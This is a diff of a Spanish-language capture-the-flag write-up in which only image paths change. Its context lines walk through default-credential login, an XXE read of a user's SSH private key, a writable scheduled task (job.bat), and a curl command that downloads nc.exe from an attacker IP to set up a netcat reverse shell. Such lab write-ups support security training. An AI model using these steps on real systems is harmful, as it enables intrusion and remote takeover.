@@ -27,7 +27,7 @@ Iniciamos la máquina y verificamos la conexión.
 ping -c 1 10.129.95.192
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Observamos que tenemos conexión y que es una máquina **Windows** ya que su **ttl=127**.
 
@@ -41,27 +41,27 @@ nmap -sCV -Pn 10.129.95.192
 
 para realizar un escaneo de puertos y servicios detallado en la dirección IP.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 4. 🚪 **Acceso Inicial**
 
 Como podemos observar durante el escaneo, los puertos **80** (**HTTP**), **22** (**SSH**) y **443** (**HTTPS**) están abiertos. A continuación, se indagará más sobre estos servicios.
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos logueamos con las credenciales por defecto **admin**:**password**.
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos al apartado de **Order** e interceptamos las peticiones. Podemos observar que hay un XML External Entity.
 
 {% embed url="https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html#main-attacks" %}
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos a leer la clave privada de SSH del usuario.
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos la copiamos y le damos permisos para loguearnos.
 
@@ -70,11 +70,11 @@ chmod 600 id_rsa
 ssh -i id_rsa daniel@10.129.95.192
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Buscamos lo que nos preguntan.
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 En este escenario, **job.bat** es un archivo utilizado para programar una tarea en Windows, que ejecuta el comando **wevtutil.exe** para registrar eventos. Este archivo es ejecutado de manera regular como parte de una tarea programada.
 
@@ -84,7 +84,7 @@ El objetivo es actualizar este proceso de **job.bat** de un script de shell simp
 icacls job.bat
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al observar que el `(F)` junto a **Users** en los permisos significa que **todos los usuarios** pueden modificar el archivo **job.bat**, se puede explotar esto para agregar un comando de **netcat** en el archivo. De esta forma, cada vez que la tarea programada se ejecute, la máquina víctima se conectará de vuelta a la máquina atacante.
 
@@ -101,7 +101,7 @@ En la máquina víctima.
 curl -o nc.exe http://10.10.16.35:8000/nc.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ejecutamos para generar una Reverse Shell.
 
@@ -113,7 +113,7 @@ Nos ponemos en escucha y recibimos la conexión.
 
 ### 5. 🔑 **Captura de la Flag**
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
